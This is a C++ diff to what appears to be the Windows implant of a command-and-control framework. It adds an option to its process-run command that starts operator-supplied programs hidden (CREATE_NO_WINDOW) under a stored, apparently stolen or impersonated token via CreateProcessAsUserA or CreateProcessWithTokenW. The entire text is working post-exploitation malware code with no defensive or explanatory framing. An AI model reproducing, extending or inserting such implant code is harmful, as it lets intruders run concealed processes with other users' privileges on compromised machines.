@@ -800,6 +800,7 @@ void Commander::CmdPsKill(ULONG commandId, Packer* inPacker, Packer* outPacker)
 void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	BOOL  progOutput   = inPacker->Unpack8();
+	BOOL  useToken     = inPacker->Unpack8();
 	BOOL  progState    = inPacker->Unpack32();
 	ULONG progArgsSize = 0;
 	CHAR* progArgs     = (CHAR*)inPacker->UnpackBytes(&progArgsSize);
@@ -822,7 +823,33 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		spi.hStdInput  = NULL;
 	}
 
-	BOOL result = ApiWin->CreateProcessA(NULL, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
+	BOOL result = FALSE;
+
+	if (useToken && g_StoredToken) {
+		result = ApiWin->CreateProcessAsUserA(g_StoredToken, NULL, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
+		if (!result && ApiWin->CreateProcessWithTokenW) {
+			STARTUPINFOW spiW = { 0 };
+			spiW.cb = sizeof(STARTUPINFOW);
+			spiW.dwFlags = spi.dwFlags;
+			spiW.wShowWindow = spi.wShowWindow;
+			spiW.hStdError = spi.hStdError;
+			spiW.hStdOutput = spi.hStdOutput;
+			spiW.hStdInput = spi.hStdInput;
+
+			int wLen = ApiWin->MultiByteToWideChar(CP_ACP, 0, progArgs, -1, NULL, 0);
+			if (wLen > 0) {
+				WCHAR* wArgs = (WCHAR*)MemAllocLocal(wLen * sizeof(WCHAR));
+				if (wArgs) {
+					ApiWin->MultiByteToWideChar(CP_ACP, 0, progArgs, -1, wArgs, wLen);
+					result = ApiWin->CreateProcessWithTokenW(g_StoredToken, LOGON_WITH_PROFILE, NULL, wArgs, progState | CREATE_NO_WINDOW, NULL, NULL, &spiW, &pi);
+					MemFreeLocal((LPVOID*)&wArgs, wLen * sizeof(WCHAR));
+				}
+			}
+		}
+	}
+	else
+		result = ApiWin->CreateProcessA(NULL, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
+
 	if (result) {
 		JobData job = agent->jober->CreateJobData(taskId, JOB_TYPE_PROCESS, JOB_STATE_RUNNING, pi.hProcess, pi.dwProcessId, pipeRead, pipeWrite);
 
